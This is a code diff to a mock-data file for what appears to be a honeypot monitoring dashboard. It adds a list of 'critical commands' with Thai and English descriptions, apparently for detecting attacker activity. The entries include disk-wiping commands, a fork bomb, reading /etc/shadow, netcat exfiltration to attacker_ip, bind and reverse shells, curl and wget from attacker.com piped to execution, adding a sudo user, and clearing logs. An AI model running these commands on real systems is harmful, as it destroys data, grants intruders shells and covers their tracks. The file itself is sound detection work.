@@ -1,4 +1,4 @@
-import type { CowrieLog, CanaryLog, HttpsPacket, Users } from './types';
+import type { CowrieLog, CanaryLog, HttpsPacket, Users, criticalCommand } from './types';
 
 // Mock Cowrie Data
 export const mockCowrieData: CowrieLog[] = [
@@ -134,4 +134,32 @@ export const mockUsersData: Users[] = [
         updatedAt: new Date('2024-12-25'),
         deletedAt: new Date('1900-01-01')
     }
+];
+
+
+export const criticalCommands: criticalCommand[] = [
+    { value: 'rm -rf /', Description: 'ลบไฟล์ทุกไฟล์ในระบบ — ทำให้เครื่องพังทันที', EnglishDescription: 'Deletes all files on the system — causes an immediate system failure.' },
+    { value: 'rm -rf *', Description: 'ลบไฟล์ทั้งหมดในโฟลเดอร์ปัจจุบัน', EnglishDescription: 'Deletes all files in the current folder.' },
+    { value: 'rm -rf ./*', Description: 'ลบไฟล์ทั้งหมดในโฟลเดอร์ปัจจุบัน', EnglishDescription: 'Deletes all files in the current folder.' },
+    { value: ':(){ :|:& };:', Description: 'fork bomb — สร้าง process ไม่สิ้นสุดจนเครื่องแฮงค์', EnglishDescription: 'A fork bomb — creates infinite processes until the system hangs.' },
+    { value: 'mkfs.ext4 /dev/sda', Description: 'ฟอร์แมตดิสก์ ทำให้ข้อมูลหายหมด', EnglishDescription: 'Formats the disk, deleting all data.' },
+    { value: 'dd if=/dev/zero of=/dev/sda', Description: 'เขียนทับดิสก์หลักด้วยศูนย์ → wipe data', EnglishDescription: 'Overwrites the main disk with zeros, wiping all data.' },
+    { value: 'shutdown -h now', Description: 'ปิดเครื่องทันที', EnglishDescription: 'Immediately shuts down the machine.' },
+    { value: 'reboot', Description: 'รีสตาร์ทเครื่อง', EnglishDescription: 'Restarts the machine.' },
+    { value: 'halt', Description: 'หยุดการทำงานทั้งหมด', EnglishDescription: 'Halts all operations.' },
+    { value: 'cat /etc/passwd', Description: 'ดู user accounts', EnglishDescription: 'Displays user accounts.' },
+    { value: 'cat /etc/shadow', Description: 'ดู password hash — ต้องเป็น root ถึงอ่านได้', EnglishDescription: 'Displays password hashes — requires root privileges to read.' },
+    { value: 'history', Description: 'ดูคำสั่งที่ผู้ใช้พิมพ์ก่อนหน้า อาจมี password', EnglishDescription: 'Displays the user’s command history; may contain passwords.' },
+    { value: 'scp user@target:/etc/passwd ./', Description: 'คัดลอกไฟล์จากเครื่องไปอีกที่หนึ่ง', EnglishDescription: 'Copies a file from a remote machine to another.' },
+    { value: 'tar -czf - / | nc attacker_ip 4444', Description: 'แพ็กข้อมูลทั้งหมดส่งออกไปหา attacker ผ่าน netcat', EnglishDescription: 'Compresses and sends all data to an attacker via Netcat.' },
+    { value: 'nc -lvp 4444 -e /bin/bash', Description: 'เปิด shell ให้ attacker เข้ามาได้', EnglishDescription: 'Opens a shell, allowing an attacker to gain access.' },
+    { value: 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1', Description: 'reverse shell ออกไปหา attacker', EnglishDescription: 'Creates a reverse shell connecting to an attacker.' },
+    { value: 'curl attacker.com/malware.sh | bash', Description: 'โหลดสคริปต์จาก attacker มารันตรง ๆ', EnglishDescription: 'Downloads and runs a script directly from an attacker.' },
+    { value: 'wget http://attacker.com/backdoor -O /tmp/x && chmod +x /tmp/x && /tmp/x', Description: 'ดาวน์โหลด backdoor แล้วรัน', EnglishDescription: 'Downloads a backdoor, makes it executable, and runs it.' },
+    { value: 'chmod 777 -R /', Description: 'เปิดสิทธิ์อ่านเขียน execute ให้ทุกไฟล์ → อันตรายต่อความปลอดภัย', EnglishDescription: 'Grants read, write, and execute permissions to all files, posing a significant security risk.' },
+    { value: 'passwd root', Description: 'เปลี่ยนรหัสผ่าน root', EnglishDescription: 'Changes the root user password.' },
+    { value: 'useradd attacker -G sudo -m', Description: 'เพิ่ม user ที่มีสิทธิ์ sudo', EnglishDescription: 'Adds a new user with sudo privileges.' },
+    { value: 'history -c', Description: 'ลบ history ทั้งหมด', EnglishDescription: 'Clears all command history.' },
+    { value: '> /var/log/auth.log', Description: 'ลบ log การ login', EnglishDescription: 'Clears the login logs.' },
+    { value: 'echo "" > ~/.bash_history', Description: 'ล้าง bash history', EnglishDescription: 'Clears the bash command history.' },
 ];
